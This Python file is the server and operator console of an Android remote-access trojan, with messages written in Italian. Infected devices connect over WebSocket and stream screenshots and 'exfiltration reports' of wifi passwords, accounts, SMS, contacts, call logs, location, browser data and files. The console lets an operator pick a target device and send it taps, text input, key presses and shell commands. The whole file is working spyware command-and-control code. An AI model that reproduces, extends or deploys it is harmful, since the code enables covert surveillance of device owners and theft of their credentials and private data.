#!/usr/bin/env python3
import asyncio, websockets, json, base64, os, datetime, sys
SCREEN_DIR = os.path.join(os.path.dirname(__file__),'..','capture')
os.makedirs(SCREEN_DIR,exist_ok=True)
devices = {}

async def ws_handler(ws):
    did = None
    try:
        m = json.loads(await asyncio.wait_for(ws.recv(),10))
        if m.get('type')=='register':
            did = m.get('device_id','?')
            devices[did] = {'ws':ws,'ip':ws.remote_address[0],'model':m.get('model','?'),'android':m.get('android','?'),'started':datetime.datetime.now()}
            print(f"\n[✅ DEVICE CONNESSO] {m.get('model','?')} ({did}) IP:{ws.remote_address[0]}")
            while True:
                m = json.loads(await asyncio.wait_for(ws.recv(),60))
                if m.get('type')=='screen':
                    with open(os.path.join(SCREEN_DIR,f'{did}_live.jpg'),'wb') as f: f.write(base64.b64decode(m['data']))
                    print(f"\r[📸 Screen] {len(m['data'])/1.33:.0f} KB",end='',flush=True)
                elif m.get('type')=='exfiltration_report':
                    print(f"\n[📁 EXFIL REPORT DA {did}]")
                    r = json.loads(m.get('data','{}'))
                    for k in ['device_info','wifi_passwords','accounts','contacts','sms','call_log','location','installed_apps','browser_data','files','notifications','clipboard']:
                        v = r.get(k,[])
                        print(f"    {k}: {len(v) if isinstance(v,(list,dict)) else v}")
                    with open(os.path.join(SCREEN_DIR,f'{did}_report_{datetime.datetime.now().strftime("%Y%m%d_%H%M%S")}.json'),'w') as f:
                        json.dump(r,f,indent=2,default=str)
                    print(f"    Report salvato ✓")
                elif m.get('type')=='shell_output':
                    print(f"\n[💻 OUTPUT]\n{m.get('output','')}")
    except: pass
    finally:
        if did and did in devices: del devices[did]
        if did: print(f"\n[-] {did} disconnesso")

async def console():
    await asyncio.sleep(1)
    target = None
    print("\n"+"="*60)
    print("  RCS - Console di Controllo Remoto")
    print("="*60)
    print("  help, list, use <id>, exfil, screenshot, tap x y,")
    print("  text <s>, key <home|back|enter>, shell <cmd>")
    print("="*60)
    while True:
        try:
            cmd = await asyncio.get_event_loop().run_in_executor(None,input,"\nrcs> ")
            parts = cmd.strip().split(maxsplit=1)
            a, p = parts[0].lower() if parts else '', parts[1] if len(parts)>1 else ''
            if a=='help': print("Comandi: list, use <id>, exfil, screenshot, tap x y, text <s>, key <home|back|enter|power>, shell <cmd>, info, exit")
            elif a=='list':
                if not devices: print("[!] Nessun device")
                for d_id,d in devices.items():
                    e=datetime.datetime.now()-d['started']
                    print(f"  {d_id} | {d['model']} | {d['ip']} | da {e.seconds//60}m")
            elif a=='use':
                if p in devices: target=p; print(f"[+] Target: {devices[target]['model']}")
                else: print("[-] Device non trovato")
            elif a in ('exfil','screenshot','tap','text','key','shell','info'):
                if not target or target not in devices: print("[-] Usa 'use <id>' prima"); continue
                if a=='info': d=devices[target]; print(f"  {d['model']} | Android {d['android']} | {d['ip']}")
                else: await devices[target]['ws'].send(json.dumps({'type':'command','action':a,'params':p})); print(f"[+] Comando inviato")
            elif a=='exit': return
            else: print("[-] ? Digita 'help'")
        except (KeyboardInterrupt,EOFError): print("\n[!] Uscita..."); return
        except Exception as e: print(f"[-] Errore: {e}")

async def main():
    port = int(sys.argv[1]) if len(sys.argv)>1 else 8765
    print(f"[*] RCS Server su 0.0.0.0:{port}")
    async with websockets.serve(ws_handler,"0.0.0.0",port): await console()

if __name__=='__main__': asyncio.run(main())
